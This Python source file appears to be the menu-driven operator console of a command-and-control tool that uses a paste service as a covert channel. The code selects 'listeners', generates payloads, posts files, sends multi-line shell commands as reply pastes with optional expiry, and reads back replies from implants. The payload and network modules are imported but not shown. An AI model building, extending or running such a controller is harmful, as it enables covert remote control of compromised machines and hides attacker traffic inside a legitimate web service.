from src.serverSettings import *
from src.listeners import *
from src.serverInterface import *
from src.files import *
from src.payload_generator import *



def home(reminderText=""):

    homeScreen()
    print(reminderText)
    selection = input("Option: ")
    clearScreen()
    
    match selection:
        case "0":
            initialize()
            home()

        case "1":
            viewSettings()
            home()
        
        case "2":
            viewListeners()
            home()

        case "3":
            viewFiles()
            home()

        case "4":
            postListener()
            waitToContinue()
            clearScreen()
            home()

        case "5":
            postFile()
            waitToContinue()
            clearScreen()
            home()

        case "6":
            sendCommands()
            home()

        case "7":
            pass
            home()

        case "8":
            getCmdQueue()
            home()

        case "9":
            generatePayload()
            waitToContinue()
            clearScreen()
            home()

        case "10":
            exit()
        case _:
            home("Please enter a number selection.")


def load():
    clearScreen()
    splashScreen()
    
    config = readConfig()
    if(not config["server_data"]["initialized"]):
        initialize()

def viewFiles():
    filesList = getFiles()
    displayList(filesList)
    waitToContinue()
    clearScreen()

def viewListeners():
    listenersList = getListeners()
    displayList(listenersList)
    waitToContinue()
    clearScreen()
    
def getCmdQueue():
    listenersList = getListeners()
    displayList(listenersList)
    selection = input("Select Listener by ID to view commands\n ID: ").strip()

    listener = getListenerById(selection)
    if listener is None:
        print("Error: No listener found with that ID.")
        waitToContinue()
        clearScreen()
        return

    try:
        paste = getPostByID(selection)
        print(f"\n[Original - {selection}]")
        print(paste.get("raw", ""))
    except Exception as e:
        print(f"Could not load original paste: {e}")
        waitToContinue()
        clearScreen()
        return

    try:
        reply_ids = getReplyIDs(listener["name"])
        if reply_ids:
            for reply_pid in reply_ids:
                try:
                    reply_paste = getPostByID(reply_pid)
                    print(f"\n[Reply - {reply_pid}]")
                    print(reply_paste.get("raw", ""))
                except Exception as e:
                    print(f"Could not load reply {reply_pid}: {e}")
        else:
            print("\n(No replies found)")
    except Exception as e:
        print(f"Could not fetch replies: {e}")

    waitToContinue()
    clearScreen()

def sendCommands():
    listenersList = getListeners()
    displayList(listenersList)
    selection = input("Select Listener by ID to send commands\n ID: ").strip()
    if not selection:
        print("No ID entered.")
        waitToContinue()
        clearScreen()
        return

    listener = getListenerById(selection)
    if listener is None:
        print("Error: No listener found with that ID.")
        waitToContinue()
        clearScreen()
        return

    print("Enter command text (blank line alone to finish):")
    lines = []
    while True:
        line = input()
        if line == "":
            break
        lines.append(line)
    commands = "\n".join(lines)

    if not commands:
        print("No command text entered; nothing sent.")
        waitToContinue()
        clearScreen()
        return

    expire_input = input("Expiration in minutes (leave blank for no expiry): ").strip()
    expire = expire_input if expire_input.isdigit() else None

    title = "RE: " + listener["name"]
    try:
        response = replyPost(commands, title, reply_to_pid=selection, expire=expire)
        if response.status_code == 200:
            print("Commands posted: " + response.text.strip())
        else:
            print("Error: Unexpected response " + str(response.status_code))
    except Exception as e:
        print(f"Could not post commands: {e}")

    waitToContinue()
    clearScreen()

def viewSettings():
    settingsDictionary = getSettings()
    displayDictionary(settingsDictionary)
    waitToContinue()
    clearScreen()


def waitToContinue():
    input("Press [Enter] to continue:")